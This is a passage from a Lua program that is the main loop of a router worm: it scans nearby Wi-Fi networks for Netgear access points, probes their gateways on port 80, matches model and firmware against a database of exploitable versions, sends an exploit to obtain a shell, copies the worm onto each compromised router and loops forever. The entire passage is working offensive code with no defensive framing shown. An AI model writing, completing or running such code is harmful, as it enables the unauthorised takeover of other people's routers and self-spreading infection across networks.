        ap.band or "?",
        is_done and "[DONE]" or (is_tgt and "<<< TARGET" or "")))
    end

    if #targets == 0 then
      log("No new Netgear targets this round")
      log("Sleeping " .. SCAN_INTERVAL .. "s before next scan...")
      sleep(SCAN_INTERVAL)
      goto continue_scan
    end

    log(#targets .. " new Netgear target(s) identified")

    -- Sort by RSSI (strongest first)
    table.sort(targets, function(a, b)
      return (a.rssi or -999) > (b.rssi or -999)
    end)

    -- Try each target
    for _, target in ipairs(targets) do
      log("")
      log(">>> Targeting: " .. (target.ssid or "???") ..
          " (" .. (target.bssid or "") .. ") RSSI:" .. tostring(target.rssi or "?"))

      -- Try common gateway IPs
      for _, gw_ip in ipairs(GATEWAY_IPS) do
        -- Skip our own IPs
        local is_mine = false
        for _, myip in ipairs(my_ips) do
          if myip == gw_ip then is_mine = true; break end
        end
        if is_mine then goto next_ip end

        if not port_open(gw_ip, 80, 2) then goto next_ip end

        log("Port 80 open on " .. gw_ip .. " - probing...")

        local det_model, det_fw = detect_model(gw_ip)
        if not det_model then
          csv_log(target.ssid, target.bssid, target.band,
                  tostring(target.channel), tostring(target.rssi),
                  "", "", gw_ip, "no_model_detected")
          goto next_ip
        end

        local model = normalize_model(det_model)
        if not model or not GADGETS[model] then
          csv_log(target.ssid, target.bssid, target.band,
                  tostring(target.channel), tostring(target.rssi),
                  det_model, "", gw_ip, "model_not_in_db")
          log("Model '" .. det_model .. "' not in gadget database")
          goto next_ip
        end

        local version = extract_version(det_fw)
        if not version or not GADGETS[model][version] then
          csv_log(target.ssid, target.bssid, target.band,
                  tostring(target.channel), tostring(target.rssi),
                  model, det_fw or "", gw_ip, "version_not_exploitable")
          log("Version " .. (det_fw or "?") .. " not exploitable for " .. model)
          goto next_ip
        end

        log("EXPLOITABLE: " .. model .. " v" .. version .. " at " .. gw_ip)

        -- Send exploit
        if send_exploit(gw_ip, model, version) then
          csv_log(target.ssid, target.bssid, target.band,
                  tostring(target.channel), tostring(target.rssi),
                  model, version, gw_ip, "SHELL_OK")

          -- Try to deploy worm to new target
          local deployed = false
          for _, myip in ipairs(my_ips) do
            log("Trying to deploy from " .. myip .. "...")
            deployed = deploy_to_target(gw_ip, myip)
            if deployed then break end
          end

          if deployed then
            csv_log(target.ssid, target.bssid, target.band,
                    tostring(target.channel), tostring(target.rssi),
                    model, version, gw_ip, "WORM_DEPLOYED")
            log("WORM DEPLOYED to " .. gw_ip .. "!")
          else
            csv_log(target.ssid, target.bssid, target.band,
                    tostring(target.channel), tostring(target.rssi),
                    model, version, gw_ip, "shell_ok_no_deploy")
          end

          total_exploited = total_exploited + 1
          -- Mark this BSSID as done
          if target.bssid then
            exploited_bssids[target.bssid:lower()] = true
          end
          goto next_target  -- Exploited this target, move to next AP
        else
          csv_log(target.ssid, target.bssid, target.band,
                  tostring(target.channel), tostring(target.rssi),
                  model, version, gw_ip, "exploit_no_shell")
        end

        ::next_ip::
      end

      -- If we get here, no gateway IP worked for this target
      csv_log(target.ssid, target.bssid, target.band,
              tostring(target.channel), tostring(target.rssi),
              "", "", "", "unreachable")

      ::next_target::
    end

    -- Round summary
    log("")
    log("Round " .. scan_round .. " complete — total exploited: " .. total_exploited)
    log("Sleeping " .. SCAN_INTERVAL .. "s before next scan...")
    sleep(SCAN_INTERVAL)

    ::continue_scan::
  end
  -- (loop never exits — worm runs persistently)
end

-- Run
main()
